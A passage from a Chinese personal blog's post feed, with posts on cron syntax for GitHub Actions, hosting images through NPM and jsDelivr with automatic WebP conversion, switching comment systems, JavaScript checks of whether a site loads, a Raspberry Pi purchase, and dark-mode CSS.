class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 18:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"From Twikoo To Waline","date":"2021-04-19 21:25:00","description":"\n<p>我建立博客以来，评论系统一直都在变化。你看，又换回 Waline 了。</p>\n<p>更换过程：</p>\n<p>Gitalk -&gt; Valine -&gt; Waline -&gt; Twikoo -&gt; Waline </p>\n<p>更换的原因是 Tencent CloudBase 的数据库每天只有 500 次读取，随随便便就没了，体验不是很好。</p>\n<p>而我需要的是一款有后端、免费部署的评论系统，于是我选择了 Waline。</p>\n<p>现在每天使用 GitHub Action 向 Waline API 发生请求，避免 LeanCloud 存档。</p>\n","link":"https://blog.yfun.top/posts/1685510532/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 20:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"树莓派 4 揽件日志","date":"2021-03-19 19:16:00","description":"\n<p>前两天在淘宝上购买了一台 4GB 版本的 树莓派 4 。</p>\n<p>在安装系统时我选择了 <code>Ubuntu Server</code> 系统，因为我并不打算使用图形化界面，而且 Raspbian 系统只有 32 位的 ╮(╯▽╰)╭。</p>\n<p>而商家发的是中通快递，速度慢不说，外包装都给我压烂了。(ó﹏ò｡)</p>\n<p>商家随主板还发货了一个闪迪 32GB TF 卡（读写速度还可以），一个电源，一个外壳还有一个小风扇。</p>\n<p>目前先折腾折腾，玩一玩，后面继续写文章。</p>\n<p>目前没有把网站迁移上去的想法，因为这样的话网站会变得很不稳定。</p>\n","link":"https://blog.yfun.top/posts/229627020/"},{"title":"为网站加入友好的深色模式支持","date":"2021-01-22 12:29:38","description":"\n<div class=\"note note-info\">            <div class=\"title\">转载文章</div>原文标题：你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持<p>原文链接：<a href=\"https://blog.skk.moe/post/hello-darkmode-my-old-friend/\">https://blog.skk.moe/post/hello-darkmode-my-old-friend/</a><br>原文作者：Sukka</p>          </div>\n<p>前几天为我的 Hexo 主题：Miracle 加入了深色模式，但我的技术还是太辣鸡，经常出现问题。</p>\n<p>无意间看到 Sukka 大佬的文章：「你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持」，跟着文章重构了主题深色模式的代码，就转载过来方便学习。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%80%E4%B9%88%E6%98%AF%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"什么是「深色模式」\"></a>什么是「深色模式」</h2>\n<p>很多操作系统在日落后会自动切换到「深色模式」、并不意味着「深色模式」就是「夜间模式」。「夜间模式」用于夜晚的弱光环境，主要目的是保护眼睛、减少强光刺激、避免影响睡眠，不难理解为什么 macOS 的 Night Shift 会自动调节屏幕色温、Android（AOSP）到了夜间可以选择启用系统级「琥珀色」滤镜。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/macos-settings.png\"><p>「深色模式」更像是一个主题，即使在白天也可以使用。不论是为了在 OLED 屏幕上省电、亦或是减少白光刺激护眼、亦或是暗色模式对色盲用户更加友好，总之 macOS 率先提出了系统级的「暗色模式」、并在 WebKit 中增加了对应的 Media Query，而后 Chromium、Firefox 先后跟进，如今兼容 <code>prefers-color-scheme</code> 的浏览器占有率已经高达 81.82%。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%88%A9%E7%94%A8-Media-Query-%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"利用 Media Query 简单实现深色模式\"></a>利用 Media Query 简单实现深色模式</h2>\n<p>CSS 媒体查询 <code>@media</code> 是一个足够强大的特性，可以有条件地将样式应用于文档和各种上下文中。<a href=\"https://drafts.csswg.org/mediaqueries-5/\">Media Queries Level 5 草案</a> 中提出了深色模式的判断方式 <code>prefers-color-scheme</code>，包含 <code>light</code>、<code>dark</code>、<code>no-preference</code> 三种值。而不支持 Media Queries 5 的浏览器会直接无视 CSS 中的 <code>prefers-color-scheme</code> Media Query，无需额外的代码即可优雅降级。</p>\n<p>还记得我刚刚说过「深色模式更像一个主题」么？为网站新增深色模式就如同换肤功能；搭配 <code>prefers-color-scheme</code>，编写深色模式的思路就如同编写响应式一般、无需赘述，结合几段 Code Snippet 一笔带过：</p>\n<h3>\n<a href=\"https://blog.yfun.top/#CSS-Variable-%E7%9A%84%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"CSS Variable 的方法实现深色模式\"></a>CSS Variable 的方法实现深色模式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-text</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>通过维护两套 CSS Variable，可以快速切换不同的配色方案。这种方法特点是所需代码较少，缺点是 CSS Variable 的兼容性较差，可能还需要引入额外的 Polyfill。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%BA%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E5%8D%95%E7%8B%AC%E7%BC%96%E5%86%99%E6%A0%B7%E5%BC%8F\" class=\"headerlink\" title=\"为深色模式单独编写样式\"></a>为深色模式单独编写样式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span 